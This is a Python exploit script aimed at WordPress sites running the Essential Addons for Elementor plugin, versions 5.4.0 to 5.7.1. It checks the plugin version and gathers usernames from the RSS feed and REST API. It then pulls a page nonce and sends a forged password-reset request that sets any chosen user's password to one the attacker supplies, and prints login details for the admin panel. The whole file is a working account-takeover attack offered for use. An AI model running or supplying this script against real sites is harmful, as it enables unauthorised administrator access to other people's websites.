import argparse
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from bs4 import BeautifulSoup

def check_version(url):
    response = requests.get(f"{url}")
    version_match = re.search(r"/plugins/essential-addons-for-elementor-lite/assets/front-end/css/view/general\.min\.css\?ver=(\d+\.\d+\.\d+)", response.text)
    if version_match:
        version = version_match.group(1)
        if "5.4.0" <= version <= "5.7.1":
            return True
        else:
        	print("Vulnerable version not found")
        	exit()

def extract_usernames(wordpress_url):
    rss_usernames = extract_usernames_rss(wordpress_url)
    rest_api_usernames = get_usernames_rest_api(wordpress_url)
    all_usernames = set(rss_usernames + rest_api_usernames)
    return list(all_usernames)


# Method 1: Using WordPress RSS feed
def extract_usernames_rss(wordpress_url):
    response = requests.get(f"{wordpress_url}/feed/")
    soup = BeautifulSoup(response.text, "xml")
    all_usernames = []
    for item in soup.find_all("item"):
        creator = item.find("dc:creator")
        if creator and creator.text:
            all_usernames.append(creator.text)
    return all_usernames


# Method 2: Using WordPress REST API
def get_usernames_rest_api(wordpress_url):
    api_url = wordpress_url + '/wp-json/wp/v2/users'
    response = requests.get(api_url)
    if response.status_code == 200:
        users = response.json()
        usernames = [user['slug'] for user in users]
        return usernames
    else:
        print(f"Failed to fetch usernames using REST API. Error: {response.text}")
        return []
        
def select_username(usernames):
    if not usernames:
        print("Sorry, unable to help. No usernames found.")
        exit()

    print("Please select a username:")
    for i, username in enumerate(usernames):
        print(f"{i+1}. {username}")
    index = int(input("> ")) - 1
    return list(usernames)[index]

def extract_nonce(wordpress_url):
    try:
        url = f"{wordpress_url}/"
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "lxml")
        script_tag = soup.find("script", text=lambda t: "var localize" in str(t))
        script_text = script_tag.text.strip() if script_tag else ""
        nonce_start_index = script_text.find('"nonce":"') + 9
        nonce_end_index = script_text.find('"', nonce_start_index)
        return script_text[nonce_start_index:nonce_end_index]
    except Exception as e:
        print("Sorry, not able to help.")
        exit()

def send_request(wordpress_url, nonce, user, password):
    url = f"{wordpress_url}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    payload = {
        "action": "login_or_register_user",
        "eael-resetpassword-submit": "true",
        "page_id": "124",
        "widget_id": "224",
        "eael-resetpassword-nonce": nonce,
        "eael-pass1": password,
        "eael-pass2": password,
        "rp_login": f"{user}"
    }

    response = requests.post(url, headers=headers, data=payload, verify=False)

    if 'success":true' in response.text:
    	print("All Set! You can now login using the following credentials:")
    	print("Username: ",user)
    	print("Password: ",password)
    	print("Admin Url: "+wordpress_url+"/wp-admin/")
    else:
    	print("Error, see html response below to debug")
    	print(response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL of the WordPress site")
    parser.add_argument("-p", "--password", required=True, help="Password to set for the selected username")
    args = parser.parse_args()

    check_version(args.url)

    try:
        all_usernames = extract_usernames(args.url)
    except Exception as e:
        print(f"Error extracting usernames: {e}")
        exit()

    selected_username = select_username(all_usernames)

    nonce = extract_nonce(args.url)
    if not nonce:
        print("Sorry, not able to extract the nonce")
        exit()
    print(f"Nonce value: {nonce}")

    send_request(args.url, nonce, selected_username, args.password)
